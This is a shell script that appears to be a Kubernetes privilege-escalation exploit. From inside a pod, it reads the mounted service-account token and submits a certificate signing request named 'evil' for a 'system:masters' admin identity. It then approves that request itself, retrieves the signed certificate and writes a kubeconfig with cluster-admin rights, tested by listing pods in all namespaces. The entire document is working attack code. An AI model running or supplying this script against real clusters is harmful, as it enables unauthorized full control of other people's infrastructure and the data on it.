#!/bin/sh 

# download tools 
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.2/bin/linux/amd64/kubectl && chmod 700 kubectl 
curl -Lo cfssl https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssl_1.5.0_linux_amd64 && chmod 700 cfssl
curl -Lo cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssljson_1.5.0_linux_amd64 && chmod 700 cfssljson

# create a certificate signing request
cat <<EOF | ./cfssl genkey - | ./cfssljson -bare server
{
  "CN": "admin",
  "names": [
      {
        "O": "system:masters"
      }
  ],
  "key": {
    "algo": "rsa",
    "size": 2048
  }
}
EOF

# create a signing request
cat <<EOF | ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt apply -f -
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: evil
spec:
  signerName: kubernetes.io/legacy-unknown
  request: $(cat server.csr | base64 | tr -d '\n')
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF

# approve certfiicate request
./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
--server='https://kubernetes.default.svc.cluster.local' \
certificate approve evil

# get client cert (server.crt)
./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
--server='https://kubernetes.default.svc.cluster.local' \
get csr evil -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt

# create kubeconfig 
cat <<EOF > ./config
apiVersion: v1
kind: Config
preferences: {}
current-context: default
clusters:
  - name: default
    cluster:
      certificate-authority: /run/secrets/kubernetes.io/serviceaccount/ca.crt 
      server: https://kubernetes.default.svc.cluster.local
contexts:
- context:
    cluster: default
    namespace: default
    user: default
  name: default
users:
  - name: default
    user:
      client-certificate: $(pwd)/server.crt 
      client-key: $(pwd)/server-key.pem
      username: admin
EOF

# test
./kubectl --kubeconfig=config get pods -A

